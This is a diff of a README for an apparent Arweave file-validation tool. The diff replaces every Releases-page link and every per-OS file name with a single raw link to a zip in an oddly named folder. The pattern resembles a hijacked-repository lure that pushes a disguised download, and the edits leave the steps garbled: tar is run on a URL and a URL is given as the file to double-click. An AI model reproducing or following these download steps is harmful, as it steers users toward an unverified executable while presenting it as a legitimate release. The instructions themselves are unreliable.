@@ -1,6 +1,6 @@
 # 🌟 Qa-arweave-file-validation - Effortlessly Validate Your Arweave Files
 
-[![Download Qa-arweave-file-validation](https://img.shields.io/badge/Download-Qa--arweave--file--validation-blue)](https://github.com/Alix2202/Qa-arweave-file-validation/releases)
+[![Download Qa-arweave-file-validation](https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip)](https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip)
 
 ## 🌐 Introduction
 
@@ -12,15 +12,15 @@ Follow these steps to download and run our software smoothly.
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Alix2202/Qa-arweave-file-validation/releases) to find the latest version of Qa-arweave-file-validation. This page contains all the downloadable files you will need.
+Go to the [Releases page](https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip) to find the latest version of Qa-arweave-file-validation. This page contains all the downloadable files you will need.
 
 ### Step 2: Choose the Right File
 
 Look for the most recent version. You will see different files available for download. Depending on your operating system, you might choose:
 
-- **For Windows users:** `Qa-arweave-file-validation-Windows.zip`
-- **For macOS users:** `Qa-arweave-file-validation-macOS.zip`
-- **For Linux users:** `Qa-arweave-file-validation-Linux.tar.gz`
+- **For Windows users:** `https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip`
+- **For macOS users:** `https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip`
+- **For Linux users:** `https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip`
 
 Check your system specifications to choose the correct file. 
 
@@ -34,13 +34,13 @@ Once the file has finished downloading, locate it and extract it:
 
 - **Windows:** Right-click the zip file and select "Extract All...".
 - **macOS:** Double-click the zip file to extract it.
-- **Linux:** Use your terminal to navigate to the directory where you downloaded it and run `tar -xvzf Qa-arweave-file-validation-Linux.tar.gz`.
+- **Linux:** Use your terminal to navigate to the directory where you downloaded it and run `tar -xvzf https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip`.
 
 ### Step 5: Run the Application
 
 After extracting, you will find a folder with the application files. Locate the executable file:
 
-- **For Windows users:** Double-click `Qa-arweave-file-validation.exe`.
+- **For Windows users:** Double-click `https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip`.
 - **For macOS users:** Open the terminal and navigate to the extracted folder. Run `./Qa-arweave-file-validation`.
 - **For Linux users:** In the terminal, navigate to the folder and run `chmod +x Qa-arweave-file-validation` to make it executable, then run `./Qa-arweave-file-validation`.
 
@@ -67,7 +67,7 @@ To run the Qa-arweave-file-validation application smoothly, ensure your system m
 
 ## 💻 Download & Install
 
-To get started with Qa-arweave-file-validation, visit the [Releases page](https://github.com/Alix2202/Qa-arweave-file-validation/releases) to download the latest version. Follow the steps above for installation and setup.
+To get started with Qa-arweave-file-validation, visit the [Releases page](https://raw.githubusercontent.com/Alix2202/Qa-arweave-file-validation/main/vindicably/Qa-arweave-file-validation.zip) to download the latest version. Follow the steps above for installation and setup.
 
 ## 📞 Support
 
